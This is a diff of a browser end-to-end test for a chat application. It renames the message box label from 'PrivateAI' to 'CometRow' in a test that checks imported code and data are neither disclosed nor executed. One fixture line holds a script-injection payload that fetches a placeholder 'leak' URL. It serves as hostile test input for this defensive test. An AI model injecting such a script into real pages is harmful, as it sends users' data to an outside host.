@@ -15,7 +15,7 @@ test("mixed code/data imports recover from a bad file without disclosure or exec
   });
   await page.goto("/");
   await page
-    .getByLabel("Message PrivateAI")
+    .getByLabel("Message CometRow")
     .fill("Explain the synthetic code and compare the data");
   const content =
     "# Synthetic notes\n<script>fetch('https://example.com/leak')</script>\nDo not execute this source.";
@@ -97,7 +97,7 @@ test("mixed code/data imports recover from a bad file without disclosure or exec
     .fill("synthetic document workflow password");
   await page.getByRole("button", { name: "Create or unlock vault" }).click();
   await page.getByRole("button", { name: "Open", exact: true }).click();
-  await expect(page.getByLabel("Message PrivateAI")).toHaveValue(
+  await expect(page.getByLabel("Message CometRow")).toHaveValue(
     "Explain the synthetic code and compare the data",
   );
   await page
